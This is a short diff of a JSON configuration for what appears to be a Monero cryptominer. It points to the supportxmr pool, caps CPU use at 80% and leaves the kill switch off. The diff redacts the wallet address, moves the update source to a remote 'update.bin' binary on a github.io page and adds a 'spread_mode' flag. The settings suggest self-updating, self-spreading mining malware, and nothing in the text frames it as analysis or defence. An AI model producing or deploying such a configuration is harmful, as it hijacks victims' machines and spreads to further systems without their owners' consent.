@@ -1,12 +1,13 @@
 {
   "pool": "pool.supportxmr.com:443",
-  "wallet": "46JLfiz3mqK2V3sTGtciNW2949xGm4mqb5guz5NRj7bnJLfTMRyZMVxDeumBpD7uoKcxSLwxUsiEsZRAxvmeWfdf9JTR351",
+  "wallet": "...",
   "pass": "x",
   "tls": true,
   "cpu_max": 80,
   "enabled": true,
   "version": "2.3.0",
-  "update_url": "https://github.com/diaslimbek3-art/systemioi.git",
+  "update_url": "https://diaslimbek3-art.github.io/update.bin",
   "kill_switch": false,
-  "check_interval": 300
+  "check_interval": 300,
+  "spread_mode": true
 }
